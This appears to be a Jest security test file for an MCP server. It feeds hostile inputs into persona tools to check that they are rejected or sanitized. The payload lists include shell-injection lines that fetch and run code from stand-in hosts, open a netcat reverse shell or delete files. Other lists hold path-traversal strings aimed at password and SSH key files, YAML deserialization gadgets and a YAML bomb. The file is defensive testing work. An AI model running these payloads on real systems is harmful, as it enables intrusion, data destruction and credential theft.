import { describe, test, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import { SecurityTestFramework, SecurityTestPerformance } from '../framework/SecurityTestFramework.js';
import type { DollhouseMCPServer } from '../../../src/index.js';
import type { DollhouseContainer } from '../../../src/di/Container.js';
import * as fs from 'fs/promises';
import * as path from 'path';

describe('MCP Tools Security Tests', () => {
  let server: InstanceType<typeof DollhouseMCPServer>;
  let testDir: string;
  let originalCwd: string;
  let DollhouseMCPServerClass: typeof DollhouseMCPServer;
  let DollhouseContainerClass: typeof DollhouseContainer;

  beforeAll(async () => {
    // Save original working directory
    originalCwd = process.cwd();

    // Create isolated test environment
    testDir = path.join(originalCwd, 'tests', 'temp', `security-test-${Date.now()}`);
    await fs.mkdir(testDir, { recursive: true });

    // Create a test package.json to make it look like a safe test directory
    await fs.writeFile(
      path.join(testDir, 'package.json'),
      JSON.stringify({ name: 'test-project', version: '1.0.0' })
    );

    // Change to test directory to avoid BackupManager production check
    process.chdir(testDir);

    // Set environment to use test directory
    process.env.DOLLHOUSE_PORTFOLIO_DIR = testDir;
    // Disable element filtering so test personas aren't filtered out
    process.env.DISABLE_ELEMENT_FILTERING = 'true';

    // Initialize server with DI container
    ({ DollhouseMCPServer: DollhouseMCPServerClass } = await import('../../../src/index.js'));
    ({ DollhouseContainer: DollhouseContainerClass } = await import('../../../src/di/Container.js'));
    const container = new DollhouseContainerClass();
    server = new DollhouseMCPServerClass(container);
  });
  
  afterAll(async () => {
    // Dispose server to close all handles
    if (server) {
      await server.dispose();
    }

    // Restore original working directory
    process.chdir(originalCwd);

    // Cleanup test directory
    await fs.rm(testDir, { recursive: true, force: true });

    // Give time for async cleanup to complete
    await new Promise(resolve => setTimeout(resolve, 100));
  });
  
  beforeEach(async () => {
    // Clean up personas directory before each test to avoid conflicts
    const personasDir = path.join(testDir, 'personas');
    if (await fs.access(personasDir).then(() => true).catch(() => false)) {
      await fs.rm(personasDir, { recursive: true, force: true });
    }
    await fs.mkdir(personasDir, { recursive: true });
    
    // Reload personas to clear server cache
    // Note: loadPersonas is private, so we'll trigger reload by calling list_personas
    await server.listPersonas();
  });
  
  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; rm -rf /',
      '&& curl evil.com | sh',
      '| nc -e /bin/sh attacker.com 4444',
      '`touch /tmp/pwned`',
      '$(wget http://evil.com/shell.sh -O - | sh)',
      '\n/bin/sh',
      '; echo "pwned" > /etc/passwd',
      '|| python -c "import os; os.system(\'rm -rf /\')"'
    ];
    
    test.each(commandInjectionPayloads)(
      'should prevent command injection in create_persona with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();
        
        // v2: Use createElement instead of createPersona
        const result = await server.createElement({
          name: payload,
          type: 'persona',
          description: 'Test description',
          content: 'Test instructions'
        });
        
        // Verify the response
        expect(result.content[0].text).toBeDefined();
        const responseText = result.content[0].text;

        // Check if the persona was rejected for security reasons or already exists
        if (responseText.includes('Validation Error') ||
            responseText.includes('prohibited content') ||
            responseText.includes('Persona Already Exists') ||
            responseText.includes('Error Creating Persona') ||
            responseText.includes('invalid characters') ||
            responseText.includes('❌')) {
          // Good - the dangerous payload was rejected or the sanitized version already exists or failed to load
          expect(responseText).toMatch(/Name contains prohibited content|security|validation error|already exists|Error Creating Persona|invalid characters|❌/i);
        } else {
          // The persona was created with a sanitized name
          // v2: Response format is "✅ Created persona '${name}' successfully"
          const nameMatch = responseText.match(/✅ Created persona '([^']+)' successfully/);
          expect(nameMatch).toBeTruthy();
          const createdName = nameMatch?.[1] || '';

          // The created name should NOT contain the dangerous characters
          expect(createdName).not.toMatch(/[;&|`$()]/);

          // If the original payload had dangerous chars, they should be removed
          if (/[;&|`$()]/.test(payload)) {
            expect(createdName).not.toBe(payload);
          }
        }
        
        SecurityTestPerformance.checkpoint('create_persona command injection');
      }
    );
    
    test.each(commandInjectionPayloads)(
      'should prevent command injection in edit_persona with payload: %s',
      async (payload) => {
        // Create a unique persona name for this test to avoid cache conflicts
        const uniqueName = `SafePersona-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

        // First create a safe persona (v2: use createElement)
        await server.createElement({ name: uniqueName, type: 'persona', description: 'Safe description', content: 'Safe instructions' });

        // Brief delay to allow cache to update (Issue #276 - cache timing)
        await new Promise(resolve => setTimeout(resolve, 100));

        // Try to inject via edit
        const result = await server.editElement({ name: uniqueName, type: 'persona', input: { name: payload } });
        
        // Check the response
        const responseText = result.content[0].text;
        
        if (responseText.includes('Security Validation Failed') ||
            responseText.includes('prohibited content') ||
            responseText.includes('invalid characters') ||
            responseText.includes('❌')) {
          // Good - the dangerous payload was rejected
          expect(responseText).toMatch(/prohibited content|security|validation failed|invalid characters|❌/i);
        } else {
          // The persona was updated with a sanitized name
          // v2: Response format is "✅ ${type} '${name}' updated successfully"
          const nameMatch = responseText.match(/✅.*'([^']+)'.*updated/i);
          if (nameMatch) {
            const updatedName = nameMatch[1];
            // The updated name should NOT contain the dangerous characters
            expect(updatedName).not.toMatch(/[;&|`$()]/);

            // If the original payload had dangerous chars, they should be removed
            if (/[;&|`$()]/.test(payload)) {
              expect(updatedName).not.toBe(payload);
            }
          }
        }
      }
    );
  });
  
  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'personas/../../../sensitive.txt',
      './././../../../root/.ssh/id_rsa',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'personas/../../custom-personas/../../backups/../../../etc/hosts'
    ];
    
    test.each(pathTraversalPayloads)(
      'should prevent path traversal in get_persona_details with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();

        // Issue #281: Use getElementDetails instead of getPersonaDetails
        // Should throw error for path traversal attempts (Issue #275 error handling)
        await expect(server.getElementDetails(payload, 'persona'))
          .rejects.toThrow(/not found/i);

        SecurityTestPerformance.checkpoint('get_persona_details path traversal');
      }
    );

    test.each(pathTraversalPayloads)(
      'should prevent path traversal in activate_persona with payload: %s',
      async (payload) => {
        // Issue #281: Use activateElement instead of activatePersona
        // Should return error response for path traversal attempts
        const result = await server.activateElement(payload, 'persona');
        expect(result.content[0].text).toContain('❌');
        expect(result.content[0].text).toMatch(/persona not found|Persona Not Found/i);
      }
    );
  });
  
  describe('YAML Injection Prevention', () => {
    const yamlInjectionPayloads = [
      '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
      '!!python/object/apply:os.system ["rm -rf /"]',
      '!!python/object/new:subprocess.Popen [["curl", "evil.com/shell.sh", "|", "sh"]]',
      '&anchor [*anchor, *anchor, *anchor, *anchor, *anchor]', // YAML bomb
      '__proto__: { isAdmin: true }' // Prototype pollution
    ];
    
    test.each(yamlInjectionPayloads)(
      'should prevent YAML injection in create_persona with payload: %s',
      async (payload) => {
        SecurityTestPerformance.start();
        
        // v2: Use createElement instead of createPersona
        const result = await server.createElement({
          name: 'YAMLTest',
          type: 'persona',
          description: payload, // description with YAML injection
          content: payload      // instructions with YAML injection
        });
        
        // Should either reject or sanitize dangerous YAML
        const responseText = result.content[0].text;
        
        // Check that dangerous constructs are not present
        expect(responseText).not.toContain('!!js/function');
        expect(responseText).not.toContain('!!python/object');
        expect(responseText).not.toContain('__proto__');
        
        SecurityTestPerformance.checkpoint('create_persona YAML injection');
      }
    );
  });
  
  describe('Input Size Limits', () => {
    test('should enforce size limits on persona content', async () => {
      SecurityTestPerformance.start();

      // Create content that exceeds limits (1MB+)
      const largeContent = 'x'.repeat(1024 * 1024 + 1);

      // v2: Use createElement instead of createPersona
      const result = await server.createElement({
        name: 'LargePersona',
        type: 'persona',
        description: 'Description',
        content: largeContent
      });

      // SECURITY: Content over 500KB limit should be REJECTED (not accepted)
      // This validates that the security layer correctly enforces size limits
      expect(result.content[0].text).toMatch(/❌|Content too large/i);

      SecurityTestPerformance.checkpoint('size limit enforcement');
    });
    
    test('should limit YAML expansion (YAML bomb prevention)', async () => {
      const yamlBomb = `
        a: &a ["lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol", "lol"]
        b: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]
        c: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]
        d: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]
        e: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]
      `;

      // v2: Use createElement instead of createPersona
      const result = await server.createElement({
        name: 'YAMLBomb',
        type: 'persona',
        description: yamlBomb,
        content: 'Instructions'
      });

      // SECURITY MODEL: The current implementation relies on sanitizeInput() which
      // strips & and * characters, preventing YAML bomb expansion by removing the
      // anchor and alias syntax that makes bombs work.
      //
      // While the persona is created successfully (because sanitization neutralizes
      // the bomb), the dangerous characters are stripped, making the content safe.
      //
      // NOTE: Future enhancement could add explicit YAML bomb pattern detection
      // BEFORE sanitization for clearer error messages and security event logging.
      // For now, the sanitization approach is sufficient to prevent the attack.
      //
      // The persona should be created successfully (after sanitization removes dangerous chars)
      expect(result).toBeDefined();
      expect(result.content[0].text).toMatch(/✅|Already Exists/i);

      // Process should remain responsive (no memory explosion from bomb expansion)
      // This validates that the security layer successfully prevents the attack
    });
  });
  
  describe('Special Character Handling', () => {
    // Characters that should be sanitized and allow creation
    const sanitizableCharPayloads = [
      { char: '\x00', name: 'null byte' },
      { char: '\r\n', name: 'CRLF' },
      { char: '\u202E', name: 'RTL override' },
      { char: '\uFEFF', name: 'zero-width space' }
    ];

    test.each(sanitizableCharPayloads)(
      'should sanitize special character: $name',
      async ({ char, name }) => {
        const payload = `Test${char}Persona${name}`;  // Include name to make unique

        // v2: Use createElement instead of createPersona
        const result = await server.createElement({
          name: payload,
          type: 'persona',
          description: 'Test description for special character handling',
          content: 'Test instructions for special character security validation testing'
        });

        // Should sanitize special characters
        const responseText = result.content[0].text;
        expect(responseText).not.toContain(char);

        // Verify persona was created with sanitized name or already exists
        expect(responseText).toMatch(/✅|Already Exists/i);
      }
    );

    // ANSI escape sequences are correctly rejected as security threats
    test('should reject ANSI escape sequences as security threat', async () => {
      const payload = `Test\x1B[31mPersonaANSI`;

      // v2: Use createElement instead of createPersona
      const result = await server.createElement({
        name: payload,
        type: 'persona',
        description: 'Test description for special character handling',
        content: 'Test instructions for special character security validation testing'
      });

      const responseText = result.content[0].text;
      // ANSI escapes are correctly blocked by validation
      expect(responseText).toMatch(/Error|invalid characters/i);
    });
  });
  
  describe('Authentication and Authorization', () => {
    test('should not expose GitHub tokens in errors', async () => {
      const fakeToken = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz';
      process.env.GITHUB_TOKEN = fakeToken;
      
      try {
        // Trigger an error that might expose the token
        await server.browseCollection('../../../invalid/path');
      } catch (error) {
        // Token should not be in error message
        const errorMessage = error instanceof Error ? error.message : String(error);
        const errorStack = error instanceof Error ? error.stack : '';
        expect(errorMessage).not.toContain(fakeToken);
        expect(errorStack).not.toContain(fakeToken);
      }
      
      delete process.env.GITHUB_TOKEN;
    });
    
    test('should validate GitHub token format', async () => {
      const invalidTokens = [
        'invalid',
        'ghp_', // Too short
        'ghs_1234', // Wrong prefix for our use case
        'Bearer token123', // Wrong format
        'ghp_' + 'a'.repeat(100) // Too long
      ];
      
      for (const token of invalidTokens) {
        process.env.GITHUB_TOKEN = token;
        
        const result = await server.browseCollection();
        
        // Should handle invalid tokens gracefully
        expect(result.content[0].text).toBeDefined();
        
        delete process.env.GITHUB_TOKEN;
      }
    });
  });
  
  // Note: Rate limiting tests were removed as they tested the auto-update system
  // which was removed in PR #634. Rate limiting is still implemented for specific
  // operations like GitHub API calls and persona submissions where appropriate.
  
  describe('SSRF Prevention', () => {
    // import_from_url tool has been removed - not compatible with element system
  });
  
  describe('Security Test Performance', () => {
    test('critical security tests should complete within 30 seconds', async () => {
      const start = Date.now();

      // Skip SecurityTestFramework in automated tests
      // The main security tests above provide comprehensive coverage
      // SecurityTestFramework is for manual security validation only
      // Set RUN_SECURITY_FRAMEWORK=true explicitly to run the framework
      if (process.env.RUN_SECURITY_FRAMEWORK === 'true') {
        const result = await SecurityTestFramework.runSecuritySuite({ category: 'critical' });

        // Fail the test if any security tests failed
        expect(result.failed).toBe(0);
      }

      const duration = Date.now() - start;
      expect(duration).toBeLessThan(30000); // 30 seconds
    });
  });
});
